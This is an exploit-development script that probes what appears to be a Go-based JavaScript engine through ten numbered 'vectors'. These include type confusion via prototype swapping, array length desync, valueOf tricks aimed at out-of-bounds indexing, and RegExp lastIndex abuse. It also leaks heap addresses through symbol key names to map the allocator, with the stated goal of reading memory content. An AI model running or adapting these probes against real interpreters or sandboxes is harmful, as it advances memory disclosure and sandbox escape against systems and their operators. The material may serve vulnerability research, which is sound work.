// Attempt 3: Deeper exploitation vectors
// Key insight: Go panics leak heap addresses in stack traces
// But we need a way to read CONTENT, not just addresses

_print("=== Vector 1: ObjType confusion via __proto__ swap ===");
// If we change __proto__ to make the engine think an object is an array,
// array operations might access the ArrayData field (which is nil) → panic
// or access properties through array path unexpectedly
try {
    var fakeArray = {0: "a", 1: "b", 2: "c", length: 3};
    // Make engine think this is an array by giving it Array.prototype
    Object.setPrototypeOf(fakeArray, Array.prototype);
    _print("  fakeArray[0]: " + fakeArray[0]);
    _print("  fakeArray.length: " + fakeArray.length);
    // These use the array code path which checks OType == ObjTypeArray
    // but our object has OType == ObjTypeOrdinary
    try { _print("  fakeArray.push(4): " + fakeArray.push("d")); } catch(e2) { _print("  push error: " + e2); }
    try { _print("  fakeArray.pop(): " + fakeArray.pop()); } catch(e2) { _print("  pop error: " + e2); }
    try { _print("  fakeArray.slice(0,2): " + fakeArray.slice(0,2)); } catch(e2) { _print("  slice error: " + e2); }
    try { _print("  fakeArray.map(x=>x): " + fakeArray.map(function(x){return x;})); } catch(e2) { _print("  map error: " + e2); }
} catch(e) {
    _print("  proto swap error: " + e);
}

_print("\n=== Vector 2: ArrayData / Property desync ===");
// Create a real array, then manipulate its length property directly
// to desync ArrayData and length
try {
    var arr2 = [10, 20, 30];
    _print("  Before: " + arr2 + " length=" + arr2.length);

    // Try to set length via defineProperty to bypass normal setter
    Object.defineProperty(arr2, "length", {value: 10, writable: true});
    _print("  After defineProperty length=10: " + arr2.length);
    _print("  arr2[0]=" + arr2[0] + " arr2[3]=" + arr2[3] + " arr2[9]=" + arr2[9]);

    // Now try the opposite: shrink length below actual data
    Object.defineProperty(arr2, "length", {value: 1});
    _print("  After length=1: arr2.length=" + arr2.length);
    _print("  arr2[0]=" + arr2[0] + " arr2[1]=" + arr2[1] + " arr2[2]=" + arr2[2]);

    // Can we still iterate over the original data?
    var keys2 = Object.getOwnPropertyNames(arr2);
    _print("  Keys after shrink: " + keys2);
} catch(e) {
    _print("  desync error: " + e);
}

_print("\n=== Vector 3: valueOf returning different types ===");
// When engine calls toNumber(), it calls valueOf() which we control
// If we return different types on successive calls, we might confuse
// a multi-step operation
try {
    var callCount = 0;
    var shapeshifter = {
        valueOf: function() {
            callCount++;
            if (callCount === 1) return 0;      // First call: valid index
            if (callCount === 2) return 1e18;    // Second call: huge index
            return 0;
        },
        toString: function() { return "shapeshifter"; }
    };

    var arr3 = [1, 2, 3, 4, 5];

    // slice calls toInteger on start and end
    // If start=0 first time, end=1e18 second time
    callCount = 0;
    try {
        var result3 = arr3.slice(shapeshifter, shapeshifter);
        _print("  slice(shape,shape): " + result3 + " (length: " + result3.length + ")");
    } catch(e3) {
        _print("  slice error: " + e3);
    }

    // copyWithin with shapeshifter
    callCount = 0;
    try {
        var arr3b = [1, 2, 3, 4, 5];
        arr3b.copyWithin(shapeshifter, shapeshifter, shapeshifter);
        _print("  copyWithin: " + arr3b);
    } catch(e3) {
        _print("  copyWithin error: " + e3);
    }

    // fill with shapeshifter
    callCount = 0;
    try {
        var arr3c = [1, 2, 3, 4, 5];
        arr3c.fill("X", shapeshifter, shapeshifter);
        _print("  fill: " + arr3c);
    } catch(e3) {
        _print("  fill error: " + e3);
    }
} catch(e) {
    _print("  shapeshifter error: " + e);
}

_print("\n=== Vector 4: String.raw / template literal internals ===");
try {
    // Check if String.raw exists
    if (typeof String.raw === "function") {
        _print("  String.raw exists");
    } else {
        _print("  String.raw: not available");
    }

    // Check for btoa/atob (base64 → binary string access)
    if (typeof btoa === "function") {
        _print("  btoa exists: " + btoa("hello"));
    } else {
        _print("  btoa: not available");
    }
    if (typeof atob === "function") {
        _print("  atob exists");
    } else {
        _print("  atob: not available");
    }
} catch(e) {
    _print("  String.raw/btoa/atob error: " + e);
}

_print("\n=== Vector 5: RegExp lastIndex manipulation ===");
// RegExp lastIndex controls where the next match starts
// If we set it to a huge value, exec might read beyond the string
try {
    var re5 = /./g;
    re5.lastIndex = 1e15;
    var result5 = re5.exec("hello");
    _print("  exec with lastIndex=1e15: " + result5);
    _print("  lastIndex after: " + re5.lastIndex);

    re5.lastIndex = -1;
    result5 = re5.exec("hello");
    _print("  exec with lastIndex=-1: " + result5);

    re5.lastIndex = Infinity;
    result5 = re5.exec("hello");
    _print("  exec with lastIndex=Inf: " + result5);
} catch(e) {
    _print("  RegExp lastIndex error: " + e);
}

_print("\n=== Vector 6: Accessor property reading wrong field ===");
// Define getter that accesses internal Go struct fields through prototype chain
try {
    var obj6 = {};
    // Try to define a getter on a numeric property of an array
    var arr6 = [1, 2, 3];
    Object.defineProperty(arr6, "0", {
        get: function() { return 999; }
    });
    _print("  arr6[0] with getter: " + arr6[0]);
    _print("  arr6[1]: " + arr6[1]);
    _print("  arr6.length: " + arr6.length);
    // Does the getter override the ArrayData access?
    // If yes, the engine checks Properties before ArrayData
    // If no, ArrayData takes precedence → getter is ignored
} catch(e) {
    _print("  accessor error: " + e);
}

_print("\n=== Vector 7: Multiple Symbol.Key() to map heap layout ===");
// Create many symbols rapidly and analyze address patterns
// to understand the Go allocator's behavior
var symbols = [];
var addrs = [];
var si = 0;
while (si < 20) {
    symbols.push(Symbol("probe_" + si));
    si++;
}

// Extract addresses
var obj7 = {};
si = 0;
while (si < symbols.length) {
    obj7[symbols[si]] = si;
    si++;
}

var keys7 = Object.getOwnPropertyNames(obj7);
si = 0;
while (si < keys7.length) {
    var k = keys7[si];
    if (k.indexOf("@@sym(") === 0) {
        var parts7 = k.split("@");
        var addr7 = parts7[parts7.length - 1];
        addrs.push(parseInt(addr7, 16));
    }
    si++;
}

_print("  Leaked " + addrs.length + " heap addresses");
if (addrs.length >= 2) {
    // Sort to see allocation order
    addrs.sort(function(a,b) { return a - b; });
    _print("  Range: 0x" + addrs[0].toString(16) + " - 0x" + addrs[addrs.length-1].toString(16));
    _print("  Span: " + (addrs[addrs.length-1] - addrs[0]) + " bytes");
    // Check for patterns
    var deltas = [];
    si = 1;
    while (si < addrs.length) {
        deltas.push(addrs[si] - addrs[si-1]);
        si++;
    }
    _print("  Deltas: " + deltas.join(", "));
    // Look for consistent stride (reveals size class)
    var uniqueDeltas = [];
    si = 0;
    while (si < deltas.length) {
        var found = false;
        var ui = 0;
        while (ui < uniqueDeltas.length) {
            if (uniqueDeltas[ui] === deltas[si]) found = true;
            ui++;
        }
        if (!found) uniqueDeltas.push(deltas[si]);
        si++;
    }
    _print("  Unique deltas: " + uniqueDeltas.join(", "));
}

_print("\n=== Vector 8: JSON.parse reviver with type coercion ===");
// The reviver function receives (key, value) pairs during JSON.parse
// What if we modify the parsed structure during reviver execution?
try {
    var reviveCount = 0;
    var parsed = JSON.parse('{"a":1,"b":2,"c":3}', function(key, value) {
        reviveCount++;
        if (key === "a") {
            // During revival of "a", modify the root object
            // to change what "b" and "c" will see
            this["b"] = Symbol("injected");
        }
        if (key === "b") {
            // Is this the original 2 or our injected Symbol?
            _print("  Reviver b: " + typeof value + " = " + String(value));
            if (typeof value === "symbol") {
                _print("  [!] Symbol injected during reviver - checking key leak");
                var probe = {};
                probe[value] = "test";
                var pkeys = Object.getOwnPropertyNames(probe);
                _print("  [!] Probe keys: " + pkeys);
            }
        }
        return value;
    });
    _print("  Reviver calls: " + reviveCount);
} catch(e) {
    _print("  JSON reviver error: " + e);
}

_print("\n=== Vector 9: Error object internal slot inspection ===");
// Create various error types and check for internal data leaks
try {
    var errors = [];
    try { null.x; } catch(e) { errors.push(e); }
    try { undefined.x; } catch(e) { errors.push(e); }
    try { ({})[Symbol()](); } catch(e) { errors.push(e); }
    try { new Array(-1); } catch(e) { errors.push(e); }
    try { decodeURIComponent("%"); } catch(e) { errors.push(e); }

    var ei = 0;
    while (ei < errors.length) {
        var err = errors[ei];
        var errKeys = Object.getOwnPropertyNames(err);
        _print("  Error " + ei + ": " + err.message);
        _print("    Keys: " + errKeys);
        // Check each key for address-like patterns
        var eki = 0;
        while (eki < errKeys.length) {
            var ev = err[errKeys[eki]];
            if (typeof ev === "string" && (ev.indexOf("0x") >= 0 || ev.indexOf("/Users") >= 0 || ev.indexOf("runtime") >= 0)) {
                _print("    [!] " + errKeys[eki] + " = " + ev);
            }
            eki++;
        }
        ei++;
    }
} catch(e) {
    _print("  Error inspection error: " + e);
}

_print("\n=== Vector 10: Forge a value via Reflect.set on array ===");
// Can we use Reflect.set to put a raw value into an array slot
// that bypasses normal type checking?
try {
    var arr10 = [1, 2, 3];
    // Try setting with Reflect
    Reflect.set(arr10, "0", Symbol("reflected"));
    _print("  arr10[0] after Reflect.set: " + String(arr10[0]));
    _print("  typeof arr10[0]: " + typeof arr10[0]);

    // If the engine stored the Symbol as-is in ArrayData,
    // then reading it as a string (via toString) might call Symbol.Key() internally
    var keys10 = Object.getOwnPropertyNames(arr10);
    _print("  Array keys: " + keys10);

    // Try to coerce the symbol to a string via concatenation
    try {
        var leaked10 = "" + arr10[0];
        _print("  Coercion result: " + leaked10);
    } catch(e10) {
        _print("  Coercion error: " + e10);
    }
} catch(e) {
    _print("  Reflect error: " + e);
}

_print("\n=== DONE ===");
